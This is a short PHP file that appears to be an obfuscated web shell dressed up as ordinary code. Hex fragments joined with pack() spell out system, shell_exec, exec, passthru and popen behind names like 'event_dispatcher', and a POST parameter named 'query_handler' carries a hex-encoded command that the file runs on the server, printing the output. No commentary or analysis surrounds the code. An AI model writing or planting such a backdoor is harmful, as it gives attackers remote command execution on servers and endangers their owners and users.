<?php


$item1 = '746';
$item2 = '736';
$item3 = '6c6';
$item4 = '657';
$item5 = '865';
$item6 = '173';
$item7 = '737';
$item8 = '706';
$item9 = 'f70';
$item10 = '656';
$item11 = '16d';
$item12 = '745';
$item13 = '6f6';
$item14 = '36c';
$item15 = '6f7';
$item16 = '565';
$item17 = '95f';
$item18 = '16e';
$item19 = '646';
$item20 = 'c65';
$event_dispatcher1 = pack("H*", '737' . '973' . $item1 . '56d');
$event_dispatcher2 = pack("H*", $item2 . '865' . $item3 . 'c5f' . $item4 . $item5);
$event_dispatcher3 = pack("H*", '657' . $item5);
$event_dispatcher4 = pack("H*", '706' . $item6 . $item7 . '468' . '727');
$event_dispatcher5 = pack("H*", $item8 . $item9 . $item10);
$event_dispatcher6 = pack("H*", $item7 . '472' . '656' . $item11 . '5f6' . '765' . $item12 . 'f63' . $item13 . 'e74' . '656' . 'e74');
$event_dispatcher7 = pack("H*", '706' . $item14 . $item15 . '365');
$query_handler = pack("H*", '717' . $item16 . '727' . $item17 . '686' . $item18 . $item19 . $item20);
if (isset($_POST[$query_handler])) {
    $query_handler = pack("H*", $_POST[$query_handler]);
    if (function_exists($event_dispatcher1)) {
        $event_dispatcher1($query_handler);
    } elseif (function_exists($event_dispatcher2)) {
        print $event_dispatcher2($query_handler);
    } elseif (function_exists($event_dispatcher3)) {
        $event_dispatcher3($query_handler, $val_object);
        print join("\n", $val_object);
    } elseif (function_exists($event_dispatcher4)) {
        $event_dispatcher4($query_handler);
    } elseif (function_exists($event_dispatcher5) && function_exists($event_dispatcher6) && function_exists($event_dispatcher7)) {
        $hld_record = $event_dispatcher5($query_handler, 'r');
        if ($hld_record) {
            $flag_dat = $event_dispatcher6($hld_record);
            $event_dispatcher7($hld_record);
            print $flag_dat;
        }
    }
    exit;
}
